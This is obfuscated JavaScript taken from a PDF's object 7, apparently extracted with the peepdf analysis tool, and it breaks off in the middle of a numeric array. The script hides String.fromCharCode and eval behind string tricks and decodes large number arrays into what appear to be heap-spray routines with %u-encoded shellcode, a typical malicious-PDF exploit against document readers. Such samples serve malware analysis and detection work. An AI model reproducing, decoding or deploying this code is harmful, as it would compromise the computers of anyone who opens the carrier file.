// peepdf comment: Javascript code located in object 7 (version 0)

var ldyzxb = "";
ghns = "";
fywzid = true;
xzmfgo = true;
var cjmt = true,
    abehmv = "",
    achkv = 0,
    nwzxug = String,
    rgzfo = nwzxug['fyrMoHmMCHhMairHCioydiet'.replace(/[tMiyH]/g, '')],
    eopru = String,
    ahpr = eopru['e0v0a5l5'.replace(/[50ZnF]/g, '')],
    dfhkn = "13",
    zdiw = "",
    cdistx = [62, 61, 58, 153, 166, 161, 148, 167, 154, 162, 159, 83, 151, 156, 169, 146, 154, 167, 89, 172, 146, 165, 164, 163, 93, 83, 157, 152, 159, 92, 172, 64, 59, 60, 58, 170, 153, 156, 157, 152, 81, 91, 170, 148, 163, 166, 161, 97, 157, 152, 159, 154, 165, 155, 81, 93, 81, 101, 81, 111, 81, 159, 150, 161, 90, 174, 62, 61, 58, 60, 58, 172, 146, 165, 164, 163, 81, 94, 110, 83, 170, 148, 163, 166, 161, 110, 62, 61, 58, 60, 174, 64, 59, 60, 58, 172, 146, 165, 164, 163, 81, 112, 81, 172, 146, 165, 164, 163, 95, 166, 166, 149, 164, 167, 163, 156, 159, 154, 89, 99, 93, 83, 157, 152, 159, 98, 99, 92, 108, 64, 59, 60, 58, 165, 150, 167, 166, 165, 159, 83, 170, 148, 163, 166, 161, 110, 62, 61, 58, 176, 62, 61, 62, 61, 58, 153, 166, 161, 148, 167, 154, 162, 159, 83, 166, 167, 154, 159, 144, 163, 163, 156, 159, 167, 151, 91, 90, 174, 62, 61, 58, 60, 167, 148, 163, 83, 161, 148, 170, 159, 160, 148, 149, 83, 110, 83, 166, 161, 150, 166, 148, 148, 161, 152, 89, 85, 86, 168, 118, 117, 118, 108, 86, 168, 97, 99, 97, 100, 86, 168, 102, 105, 97, 99, 86, 168, 114, 100, 103, 103, 86, 168, 97, 99, 100, 99, 86, 168, 97, 99, 97, 99, 86, 168, 101, 99, 105, 117, 86, 168, 105, 117, 97, 118, 86, 168, 98, 118, 104, 99, 86, 168, 105, 117, 114, 119, 86, 168, 97, 107, 101, 99, 86, 168, 116, 102, 102, 120, 86, 168, 105, 117, 102, 104, 86, 168, 105, 117, 118, 118, 86, 168, 97, 107, 101, 104, 86, 168, 100, 102, 102, 101, 86, 168, 116, 100, 117, 101, 86, 168, 97, 102, 116, 101, 86, 168, 98, 99, 100, 101, 86, 168, 105, 99, 101, 99, 86, 168, 97, 99, 100, 107, 86, 168, 119, 104, 104, 104, 86, 168, 116, 101, 105, 117, 86, 168, 102, 119, 102, 116, 86, 168, 97, 103, 116, 101, 86, 168, 102, 104, 97, 99, 86, 168, 118, 118, 105, 117, 86, 168, 102, 100, 102, 100, 86, 168, 102, 105, 102, 102, 86, 168, 103, 99, 102, 106, 86, 168, 102, 119, 105, 117, 86, 168, 100, 102, 97, 107, 86, 168, 105, 117, 116, 99, 86, 168, 97, 118, 104, 104, 86, 168, 119, 120, 105, 117, 86, 168, 104, 105, 97, 102, 86, 168, 105, 117, 100, 118, 86, 168, 104, 107, 101, 120, 86, 168, 116, 121, 97, 102, 86, 168, 102, 100, 105, 117, 86, 168, 102, 101, 98, 118, 86, 168, 102, 100, 105, 117, 86, 168, 102, 101, 99, 103, 86, 168, 104, 100, 105, 117, 86, 168, 101, 120, 98, 103, 86, 168, 104, 104, 105, 108, 86, 168, 105, 117, 119, 118, 86, 168, 99, 99, 104, 100, 86, 168, 119, 106, 97, 102, 86, 168, 101, 116, 106, 108, 86, 168, 101, 101, 114, 119, 86, 168, 100, 117, 103, 99, 86, 168, 119, 118, 102, 104, 86, 168, 97, 103, 104, 104, 86, 168, 116, 99, 100, 102, 86, 168, 100, 106, 118, 117, 86, 168, 119, 121, 100, 102, 86, 168, 101, 104, 97, 102, 86, 168, 106, 106, 97, 118, 86, 168, 116, 121, 105, 117, 86, 168, 104, 104, 114, 120, 86, 168, 99, 117, 119, 119, 86, 168, 101, 121, 119, 108, 86, 168, 118, 107, 102, 100, 86, 168, 119, 121, 106, 103, 86, 168, 119, 121, 119, 121, 86, 168, 116, 102, 100, 117, 86, 168, 104, 103, 103, 100, 86, 168, 118, 117, 97, 101, 86, 168, 105, 117, 117, 108, 86, 168, 97, 118, 101, 104, 86, 168, 102, 120, 106, 101, 86, 168, 119, 101, 97, 102, 86, 168, 118, 99, 117, 100, 86, 168, 116, 105, 97, 102, 86, 168, 116, 108, 100, 102, 86, 168, 115, 106, 97, 121, 86, 168, 102, 121, 97, 107, 86, 168, 118, 100, 116, 100, 86, 168, 97, 102, 97, 101, 86, 168, 97, 102, 116, 116, 86, 168, 105, 117, 116, 121, 86, 168, 97, 102, 97, 100, 86, 168, 105, 108, 116, 101, 86, 168, 119, 107, 101, 104, 86, 168, 105, 117, 103, 100, 86, 168, 119, 107, 101, 104, 86, 168, 102, 120, 102, 121, 86, 168, 116, 108, 102, 117, 86, 168, 102, 104, 116, 102, 86, 168, 118, 118, 105, 117, 86, 168, 118, 107, 102, 100, 86, 168, 119, 121, 101, 108, 86, 168, 119, 121, 119, 121, 86, 168, 103, 107, 102, 99, 86, 168, 103, 99, 118, 107, 86, 168, 97, 103, 115, 121, 86, 168, 103, 118, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 100, 102, 119, 121, 86, 168, 102, 101, 117, 101, 86, 168, 119, 121, 102, 101, 86, 168, 97, 107, 104, 104, 86, 168, 117, 99, 119, 121, 86, 168, 101, 104, 105, 108, 86, 168, 105, 117, 119, 118, 86, 168, 119, 118, 101, 104, 86, 168, 116, 102, 116, 108, 86, 168, 105, 117, 102, 104, 86, 168, 105, 102, 118, 118, 86, 168, 97, 118, 118, 118, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 104, 104, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 104, 101, 119, 104, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 105, 86, 168, 101, 104, 116, 105, 86, 168, 103, 119, 119, 106, 86, 168, 101, 104, 116, 105, 86, 168, 103, 121, 119, 107, 86, 168, 101, 104, 116, 105, 86, 168, 103, 120, 119, 108, 86, 168, 101, 104, 116, 105, 86, 168, 99, 120, 119, 116, 86, 168, 101, 104, 116, 105, 86, 168, 103, 103, 119, 117, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 118, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 119, 86, 168, 101, 104, 116, 105, 86, 168, 97, 99, 119, 120, 86, 168, 114, 99, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 102, 99, 119, 121, 86, 168, 102, 119, 103, 107, 86, 168, 98, 100, 105, 116, 86, 168, 118, 107, 98, 105, 86, 168, 119, 121, 98, 104, 86, 168, 119, 121, 119, 121, 86, 168, 116, 103, 105, 102, 86, 168, 105, 104, 97, 118, 86, 168, 104, 103, 116, 99, 86, 168, 103, 116, 98, 104, 86, 168, 103, 116, 97, 99, 86, 168, 119, 121, 97, 99, 86, 168, 97, 118, 104, 104, 86, 168, 104, 104, 119, 121, 86, 168, 103, 116, 97, 107, 86, 168, 119, 121, 97, 99, 86, 168, 105, 104, 117, 99, 86, 168, 104, 104, 116, 99, 86, 168, 101, 99, 97, 102, 86, 168, 116, 102, 116, 108, 86, 168, 116, 99, 100, 102, 86, 168, 116, 102, 116, 108, 86, 168, 100, 102, 102, 106, 86, 168, 105, 117, 116, 99, 86, 168, 99, 103, 101, 118, 86, 168, 105, 117, 97, 118, 86, 168, 99, 103, 104, 118, 86, 168, 119, 118, 97, 107, 86, 168, 114, 116, 119, 102, 86, 168, 116, 102, 102, 121, 86, 168, 101, 118, 105, 117, 86, 168, 97, 103, 99, 103, 86, 168, 100, 108, 105, 99, 86, 168, 105, 117, 97, 99, 86, 168, 104, 103, 116, 100, 86, 168, 101, 99, 97, 105, 86, 168, 100, 107, 105, 99, 86, 168, 104, 104, 97, 99, 86, 168, 99, 117, 119, 116, 86, 168, 116, 102, 116, 100, 86, 168, 105, 117, 102, 104, 86, 168, 105, 102, 118, 118, 86, 168, 103, 103, 118, 118, 86, 168, 105, 119, 102, 102, 86, 168, 119, 99, 101, 104, 86, 168, 100, 102, 102, 106, 86, 168, 102, 99, 117, 117, 86, 168, 101, 104, 116, 105, 86, 168, 103, 117, 119, 99, 86, 168, 101, 104, 116, 105, 86, 168, 103, 104, 119, 100, 86, 168, 101, 104, 116, 105, 86, 168, 104, 101, 119, 101, 86, 168, 101, 104, 116, 105, 86, 168, 103, 120, 119, 102, 86, 168, 101, 104, 116, 105, 86, 168, 103, 104, 119, 103, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 104, 86, 168, 101, 104, 116, 105, 86, 168, 100, 102, 119, 105, 86, 168, 101, 104, 116, 105, 86, 168, 100, 101, 119, 106, 86, 168, 101, 104, 116, 105, 86, 168, 99, 120, 119, 107, 86, 168, 101, 104, 116, 105, 86, 168, 103, 103, 119, 108, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 116, 86, 168, 101, 104, 116, 105, 86, 168, 103, 118, 119, 117, 86, 168, 102, 119, 105, 107, 86, 168, 118, 107, 119, 118, 86, 168, 119, 121, 97, 117, 86, 168, 119, 121, 119, 121, 86, 168, 103, 107, 102, 99, 86, 168, 101, 102, 103, 107, 86, 168, 105, 120, 119, 108, 86, 168, 105, 99, 118, 107, 86, 168, 119, 121, 119, 120, 86, 168, 105, 117, 119, 121, 86, 168, 105, 119, 119, 107, 86, 168, 106, 118, 101, 104, 86, 168, 101, 103, 103, 116, 86, 168, 118, 107, 102, 99, 86, 168, 119, 121, 104, 120, 86, 168, 119, 121, 119, 121, 86, 168, 101, 104, 105, 119, 86, 168, 103, 116, 118, 99, 86, 168, 102, 99, 98, 99, 86, 168, 104, 102, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 105, 102, 119, 121, 86, 168, 98, 118, 116, 103, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 118, 99, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 106, 118, 86, 168, 102, 102, 102, 102, 86, 168, 102, 102, 102, 102, 86, 168, 102, 102, 102, 102, 86, 168, 104, 104, 119, 121, 86, 168, 116, 106, 97, 107, 86, 168, 106, 118, 101, 104, 86, 168, 97, 99, 101, 103, 86, 168, 97, 99, 97, 99, 86, 168, 119, 121, 102, 102, 86, 168, 102, 121, 117, 106, 86, 168, 115, 105, 97, 121, 86, 168, 102, 117, 116, 99, 86, 168, 116, 102, 116, 108, 86, 168, 105, 117, 102, 104, 86, 168, 102, 100, 118, 118, 86, 168, 102, 102, 102, 100, 86, 168, 102, 106, 102, 105, 86, 168, 101, 101, 103, 116, 86, 168, 104, 101, 118, 107, 86, 168, 97, 99, 97, 99, 86, 168, 105, 117, 97, 99, 86, 168, 100, 102, 117, 107, 86, 168, 105, 104, 119, 105, 86, 168, 102, 108, 117, 117, 86, 168, 101, 104, 116, 106, 86, 168, 103, 100, 119, 107, 86, 168, 103, 104, 99, 120, 86, 168, 116, 106, 104, 107, 86, 168, 119, 118, 101, 104, 86, 168, 97, 99, 103, 104, 86, 168, 97, 99, 97, 99, 86, 168, 102, 105, 104, 120, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 118, 107, 102, 105, 86, 168, 97, 99, 102, 100, 86, 168, 97, 99, 97, 99, 86, 168, 102, 99, 102, 108, 86, 168, 115, 100, 118, 107, 86, 168, 119, 121, 119, 120, 86, 168, 105, 104, 119, 121, 86, 168, 102, 108, 116, 99, 86, 168, 104, 103, 102, 108, 86, 168, 105, 119, 100, 108, 86, 168, 97, 100, 101, 105, 86, 168, 118, 107, 102, 99, 86, 168, 97, 99, 100, 117, 86, 168, 97, 99, 97, 99, 86, 168, 119, 107, 105, 117, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 99, 100, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 105, 104, 119, 121, 86, 168, 102, 108, 116, 99, 86, 168, 104, 103, 102, 108, 86, 168, 102, 106, 97, 118, 86, 168, 97, 100, 118, 107, 86, 168, 119, 121, 119, 121, 86, 168, 102, 108, 119, 121, 86, 168, 101, 103, 116, 105, 86, 168, 119, 121, 100, 107, 86, 168, 102, 99, 104, 102, 86, 168, 101, 104, 105, 119, 86, 168, 119, 120, 119, 107, 86, 168, 102, 107, 97, 99, 86, 168, 101, 104, 105, 119, 86, 168, 102, 99, 119, 107, 86, 168, 118, 107, 102, 106, 86, 168, 119, 120, 104, 103, 86, 168, 119, 121, 119, 121, 86, 168, 102, 108, 102, 108, 86, 168, 101, 105, 101, 105, 86, 168, 119, 102, 100, 117, 86, 168, 114, 116, 104, 118, 86, 168, 102, 120, 102, 121, 86, 168, 116, 108, 102, 117, 86, 168, 102, 104, 116, 102, 86, 168, 118, 118, 105, 117, 86, 168, 102, 102, 102, 100, 86, 168, 103, 99, 103, 105, 86, 168, 100, 101, 115, 100, 86, 168, 97, 99, 118, 107, 86, 168, 97, 99, 97, 99, 86, 168, 102, 107, 97, 99, 86, 168, 97, 107, 100, 107, 86, 168, 97, 102, 104, 103, 86, 168, 118, 117, 101, 99, 86, 168, 101, 99, 119, 108, 86, 168, 102, 119, 105, 117, 86, 168, 105, 99, 97, 107, 86, 168, 101, 101, 119, 117, 86, 168, 97, 107, 104, 104, 86, 168, 117, 117, 100, 102, 86, 168, 98, 107, 105, 116, 86, 168, 116, 102, 105, 117, 86, 168, 98, 106, 118, 117, 86, 168, 98, 107, 100, 107, 86, 168, 98, 100, 104, 105, 86, 168, 100, 102, 101, 99, 86, 168, 105, 103, 116, 108, 86, 168, 104, 103, 117, 117, 86, 168, 101, 99, 97, 118, 86, 168, 97, 107, 100, 107, 86, 168, 119, 117, 104, 104, 86, 168, 119, 120, 101, 99, 86, 168, 118, 117, 116, 117, 86, 168, 100, 102, 119, 101, 86, 168, 105, 108, 116, 99, 86, 168, 119, 118, 101, 104, 86, 168, 101, 104, 105, 117, 86, 168, 102, 117, 119, 118, 86, 168, 116, 102, 116, 108, 86, 168, 97, 101, 100, 101, 86, 168, 104, 103, 103, 107, 86, 168, 104, 99, 104, 103, 86, 168, 99, 121, 100, 116, 86, 168, 103, 121, 99, 121, 86, 168, 104, 104, 104, 108, 86, 168, 103, 118, 103, 120, 86, 168, 103, 120, 103, 100, 86, 168, 99, 120, 103, 103, 86, 168, 104, 101, 103, 121, 86, 168, 99, 121, 103, 106, 86, 168, 104, 101, 103, 105, 86, 168, 103, 106, 103, 100, 86, 168, 104, 102, 104, 104, 86, 168, 103, 102, 99, 121, 86, 168, 103, 117, 103, 108, 86, 168, 100, 101, 104, 101, 86, 168, 103, 104, 99, 120, 86, 168, 103, 104, 104, 107, 86, 168, 103, 107, 97, 99, 86, 168, 104, 103, 104, 103, 86, 168, 100, 116, 104, 99, 86, 168, 99, 121, 99, 121, 86, 168, 104, 108, 103, 121, 86, 168, 103, 120, 104, 104, 86, 168, 103, 100, 103, 118, 86, 168, 103, 103, 103, 120, 86, 168, 103, 121, 99, 120, 86, 168, 103, 106, 104, 101, 86, 168, 103, 105, 99, 121, 86, 168, 103, 100, 104, 101, 86, 168, 104, 104, 103, 106, 86, 168, 99, 121, 104, 102, 86, 168, 103, 118, 103, 102, 86, 168, 103, 102, 103, 108, 86, 168, 99, 120, 103, 117, 86, 168, 103, 107, 104, 99, 86, 168, 100, 121, 104, 99, 86, 168, 100, 119, 104, 101, 86, 168, 97, 99, 97, 99, 83, 92, 108, 64, 59, 60, 58, 169, 146, 165, 81, 161, 160, 163, 81, 112, 81, 168, 159, 152, 164, 150, 146, 163, 150, 91, 83, 88, 166, 99, 114, 99, 114, 88, 166, 99, 114, 99, 114, 88, 166, 99, 114, 99, 114, 88, 166, 99, 114, 99, 114, 85, 90, 64, 59, 60, 58, 169, 146, 165, 81, 155, 150, 148, 161, 149, 157, 162, 148, 158, 81, 112, 81, 161, 160, 163, 81, 94, 81, 163, 146, 172, 157, 162, 146, 151, 108, 64, 59, 60, 58, 169, 146, 165, 81, 149, 154, 154, 147, 159, 160, 150, 156, 83, 110, 83, 166, 161, 150, 166, 148, 148, 161, 152, 89, 85, 86, 168, 97, 116, 97, 116, 86, 168, 97, 116, 97, 116, 83, 92, 108, 64, 59, 60, 58, 169, 146, 165, 81, 155, 150, 148, 149, 152, 163, 166, 154, 173, 150, 83, 110, 83, 99, 99, 108, 64, 59, 60, 58, 169, 146, 165, 81, 166, 161, 165, 146, 172, 81, 112, 81, 155, 150, 148, 149, 152, 163, 166, 154, 173, 150, 83, 92, 83, 153, 152, 146, 163, 147, 159, 160, 150, 156, 97, 157, 152, 159, 154, 165, 155, 108, 64, 59, 60, 58, 170, 153, 156, 157, 152, 81, 91, 147, 156, 152, 149, 157, 162, 148, 158, 95, 159, 150, 161, 152, 167, 153, 83, 109, 83, 164, 163, 163, 148, 170, 92, 172, 64, 59, 60, 58, 60, 147, 156, 152, 149, 157, 162, 148, 158, 81, 94, 110, 83, 147, 156, 152, 149, 157, 162, 148, 158, 108, 64, 59, 60, 58, 176, 62, 61, 58, 60, 167, 148, 163, 83, 151, 156, 157, 159, 147, 159, 160, 150, 156, 83, 110, 83, 147, 156, 152, 149, 157, 162, 148, 158, 95, 166, 166, 149, 164, 167, 163, 156, 159, 154, 89, 99, 93, 83, 164, 163, 163, 148, 170, 92, 108, 64, 59, 60, 58, 169, 146, 165, 81, 149, 157, 162, 148, 158, 81, 112, 81, 149, 154, 154, 147, 159, 160, 150, 156, 97, 164, 168, 147, 166, 165, 165, 154, 161, 152, 91, 97, 95, 81, 149, 154, 154, 147, 159, 160, 150, 156, 97, 157, 152, 159, 154, 165, 155, 94, 166, 161, 165, 146, 172, 90, 110, 62, 61, 58, 60, 168, 155, 154, 159, 150, 83, 89, 149, 157, 162, 148, 158, 95, 159, 150, 161, 152, 167, 153, 94, 164, 163, 163, 148, 170, 83, 109, 83, 97, 171, 101, 99, 97, 99, 97, 92, 172, 64, 59, 60, 58, 60, 147, 159, 160, 150, 156, 83, 110, 83, 147, 159, 160, 150, 156, 83, 92, 83, 147, 159, 160, 150, 156, 83, 92, 83, 151, 156, 157, 159, 147, 159, 160, 150, 156, 110, 62, 61, 58, 60, 174, 64, 59, 60, 58, 169, 146, 165, 81, 160, 150, 160, 144, 148, 163, 165, 146, 172, 81, 112, 81, 161, 150, 170, 81, 116, 163, 165, 146, 172, 89, 92, 108, 64, 59, 60, 58, 153, 160, 165, 81, 91, 167, 148, 163, 83, 154, 83, 110, 83, 97, 110, 81, 156, 81, 111, 81, 100, 101, 99, 97, 110, 81, 156, 92, 94, 90, 174, 62, 61, 58, 60, 58, 160, 150, 160, 144, 148, 163, 165, 146, 172, 140, 156, 142, 83, 110, 83, 147, 159, 160, 150, 156, 83, 92, 83, 153, 152, 146, 163, 147, 159, 160, 150, 156, 110, 62, 61, 58, 60, 174, 64, 59, 60, 58, 169, 146, 165, 81, 161, 166, 160, 81, 112, 81, 100, 99, 108, 106, 108, 106, 108, 106, 108, 106, 108, 106, 108, 106, 108, 106, 108, 106, 108, 106, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 107, 105, 110, 62, 61, 58, 60, 166, 167, 154, 159, 95, 163, 163, 156, 159, 167, 151, 91, 83, 88, 101, 104, 97, 99, 97, 153, 83, 95, 81, 161, 166, 160, 90, 110, 62, 61, 58, 176, 62, 61, 62, 61, 58, 153, 166, 161, 148, 167, 154, 162, 159, 83, 148, 162, 157, 159, 146, 149, 144, 152, 158, 148, 154, 159, 89, 92, 172, 64, 59, 60, 58, 169, 146, 165, 81, 166, 153, 152, 157, 159, 148, 162, 149, 152, 81, 112, 81, 168, 159, 152, 164, 150, 146, 163, 150, 91, 83, 88, 166, 120, 115, 120, 106, 88, 166, 99, 97, 99, 98, 88, 166, 104, 103, 99, 97, 88, 166, 116, 98, 105, 101, 88, 166, 99, 97, 102, 97, 88, 166, 99, 97, 99, 97, 88, 166, 103, 97, 107, 115, 88, 166, 107, 115, 99, 116, 88, 166, 100, 116, 106, 97, 88, 166, 107, 115, 116, 117, 88, 166, 99, 105, 103, 97, 88, 166, 118, 100, 104, 118, 88, 166, 107, 115, 104, 102, 88, 166, 107, 115, 120, 116, 88, 166, 99, 105, 103, 102, 88, 166, 102, 100, 104, 99, 88, 166, 118, 98, 119, 99, 88, 166, 99, 100, 118, 99, 88, 166, 100, 97, 102, 99, 88, 166, 107, 97, 103, 97, 88, 166, 99, 97, 102, 105, 88, 166, 121, 102, 106, 102, 88, 166, 118, 99, 107, 115, 88, 166, 104, 117, 104, 114, 88, 166, 99, 101, 118, 99, 88, 166, 104, 102, 99, 97, 88, 166, 120, 116, 107, 115, 88, 166, 104, 98, 104, 98, 88, 166, 104, 103, 104, 100, 88, 166, 105, 97, 104, 104, 88, 166, 104, 117, 107, 115, 88, 166, 102, 100, 99, 105, 88, 166, 107, 115, 118, 97, 88, 166, 99, 116, 106, 102, 88, 166, 121, 118, 107, 115, 88, 166, 106, 103, 99, 100, 88, 166, 107, 115, 102, 116, 88, 166, 106, 105, 103, 118, 88, 166, 118, 119, 99, 100, 88, 166, 104, 98, 107, 115, 88, 166, 104, 99, 100, 116, 88, 166, 104, 98, 107, 115, 88, 166, 104, 99, 101, 101, 88, 166, 106, 98, 107, 115, 88, 166, 103, 118, 100, 101, 88, 166, 106, 102, 107, 106, 88, 166, 107, 115, 121, 116, 88, 166, 101, 97, 106, 98, 88, 166, 121, 104, 99, 100, 88, 166, 103, 114, 108, 106, 88, 166, 103, 99, 116, 117, 88, 166, 102, 115, 105, 97, 88, 166, 121, 116, 104, 102, 88, 166, 99, 101, 106, 102, 88, 166, 118, 97, 102, 100, 88, 166, 102, 104, 120, 115, 88, 166, 121, 119, 102, 100, 88, 166, 103, 102, 99, 100, 88, 166, 108, 104, 99, 116, 88, 166, 118, 119, 107, 115, 88, 166, 106, 102, 116, 118, 88, 166, 101, 115, 121, 117, 88, 166, 103, 119, 121, 106, 88, 166, 120, 105, 104, 98, 88, 166, 121, 119, 108, 101, 88, 166, 121, 119, 121, 119, 88, 166, 118, 100, 102, 115, 88, 166, 106, 101, 105, 98, 88, 166, 120, 115, 99, 99, 88, 166, 107, 115, 119, 106, 88, 166, 99, 116, 103, 102, 88, 166, 104, 118, 108, 99, 88, 166, 121, 99, 99, 100, 88, 166, 120, 97, 119, 98, 88, 166, 118, 103, 99, 100, 88, 166, 118, 106, 102, 100, 88, 166, 117, 104, 99, 119, 88, 166, 104, 119, 99, 105, 88, 166, 120, 98, 118, 98, 88, 166, 99, 100, 99, 99, 88, 166, 99, 100, 118, 114, 88, 166, 107, 115, 118, 119, 88, 166, 99, 100, 99, 98, 88, 166, 107, 106, 118, 99, 88, 166, 121, 105, 103, 102, 88, 166, 107, 115, 105, 98, 88, 166, 121, 105, 103, 102, 88, 166, 104, 118, 104, 119, 88, 166, 118, 106, 104, 115, 88, 166, 104, 102, 118, 100, 88, 166, 120, 116, 107, 115, 88, 166, 120, 105, 104, 98, 88, 166, 121, 119, 103, 106, 88, 166, 121, 119, 121, 119, 88, 166, 105, 105, 104, 97, 88, 166, 105, 97, 120, 105, 88, 166, 99, 101, 117, 119, 88, 166, 105, 116, 120, 105, 88, 166, 121, 119, 121, 119, 88, 166, 102, 100, 121, 119, 88, 166, 104, 99, 119, 99, 88, 166, 121, 119, 104, 99, 88, 166, 99, 105, 106, 102, 88, 166, 119, 97, 121, 119, 88, 166, 103, 102, 107, 106, 88, 166, 107, 115, 121, 116, 88, 166, 121, 116, 103, 102, 88, 166, 118, 100, 118, 106, 88, 166, 107, 115, 104, 102, 88, 166, 107, 100, 120, 116, 88, 166, 99, 116, 120, 116, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 121, 101, 88, 166, 103, 102, 118, 103, 88, 166, 106, 102, 121, 101, 88, 166, 103, 102, 118, 103, 88, 166, 106, 99, 121, 102, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 103, 88, 166, 103, 102, 118, 103, 88, 166, 105, 117, 121, 104, 88, 166, 103, 102, 118, 103, 88, 166, 105, 119, 121, 105, 88, 166, 103, 102, 118, 103, 88, 166, 105, 118, 121, 106, 88, 166, 103, 102, 118, 103, 88, 166, 101, 118, 121, 114, 88, 166, 103, 102, 118, 103, 88, 166, 105, 101, 121, 115, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 116, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 117, 88, 166, 103, 102, 118, 103, 88, 166, 99, 97, 121, 118, 88, 166, 116, 97, 120, 105, 88, 166, 121, 119, 121, 119, 88, 166, 104, 97, 121, 119, 88, 166, 104, 117, 105, 105, 88, 166, 100, 98, 107, 114, 88, 166, 120, 105, 100, 103, 88, 166, 121, 119, 100, 102, 88, 166, 121, 119, 121, 119, 88, 166, 118, 101, 107, 100, 88, 166, 107, 102, 99, 116, 88, 166, 106, 101, 118, 97, 88, 166, 105, 114, 100, 102, 88, 166, 105, 114, 99, 97, 88, 166, 121, 119, 99, 97, 88, 166, 99, 116, 106, 102, 88, 166, 106, 102, 121, 119, 88, 166, 105, 114, 99, 105, 88, 166, 121, 119, 99, 97, 88, 166, 107, 102, 119, 97, 88, 166, 106, 102, 118, 97, 88, 166, 103, 97, 99, 100, 88, 166, 118, 100, 118, 106, 88, 166, 118, 97, 102, 100, 88, 166, 118, 100, 118, 106, 88, 166, 102, 100, 104, 104, 88, 166, 107, 115, 118, 97, 88, 166, 101, 101, 103, 116, 88, 166, 107, 115, 99, 116, 88, 166, 101, 101, 106, 116, 88, 166, 121, 116, 99, 105, 88, 166, 116, 114, 121, 100, 88, 166, 118, 100, 104, 119, 88, 166, 103, 116, 107, 115, 88, 166, 99, 101, 101, 101, 88, 166, 102, 106, 107, 97, 88, 166, 107, 115, 99, 97, 88, 166, 106, 101, 118, 98, 88, 166, 103, 97, 99, 103, 88, 166, 102, 105, 107, 97, 88, 166, 106, 102, 99, 97, 88, 166, 101, 115, 121, 114, 88, 166, 118, 100, 118, 98, 88, 166, 107, 115, 104, 102, 88, 166, 107, 100, 120, 116, 88, 166, 105, 101, 120, 116, 88, 166, 107, 117, 104, 100, 88, 166, 121, 97, 103, 102, 88, 166, 102, 100, 104, 104, 88, 166, 104, 97, 119, 115, 88, 166, 103, 102, 118, 103, 88, 166, 105, 115, 121, 97, 88, 166, 103, 102, 118, 103, 88, 166, 105, 102, 121, 98, 88, 166, 103, 102, 118, 103, 88, 166, 106, 99, 121, 99, 88, 166, 103, 102, 118, 103, 88, 166, 105, 118, 121, 100, 88, 166, 103, 102, 118, 103, 88, 166, 105, 102, 121, 101, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 102, 88, 166, 103, 102, 118, 103, 88, 166, 102, 100, 121, 103, 88, 166, 103, 102, 118, 103, 88, 166, 102, 99, 121, 104, 88, 166, 103, 102, 118, 103, 88, 166, 101, 118, 121, 105, 88, 166, 103, 102, 118, 103, 88, 166, 105, 101, 121, 106, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 114, 88, 166, 103, 102, 118, 103, 88, 166, 105, 116, 121, 115, 88, 166, 104, 117, 107, 105, 88, 166, 120, 105, 121, 116, 88, 166, 121, 119, 99, 115, 88, 166, 121, 119, 121, 119, 88, 166, 105, 105, 104, 97, 88, 166, 103, 100, 105, 105, 88, 166, 107, 118, 121, 106, 88, 166, 107, 97, 120, 105, 88, 166, 121, 119, 121, 118, 88, 166, 107, 115, 121, 119, 88, 166, 107, 117, 121, 105, 88, 166, 108, 116, 103, 102, 88, 166, 103, 101, 105, 114, 88, 166, 120, 105, 104, 97, 88, 166, 121, 119, 106, 118, 88, 166, 121, 119, 121, 119, 88, 166, 103, 102, 107, 117, 88, 166, 105, 114, 120, 97, 88, 166, 104, 97, 100, 97, 88, 166, 106, 100, 120, 105, 88, 166, 121, 119, 121, 119, 88, 166, 107, 100, 121, 119, 88, 166, 100, 116, 118, 101, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 120, 97, 88, 166, 103, 102, 107, 117, 88, 166, 104, 97, 108, 116, 88, 166, 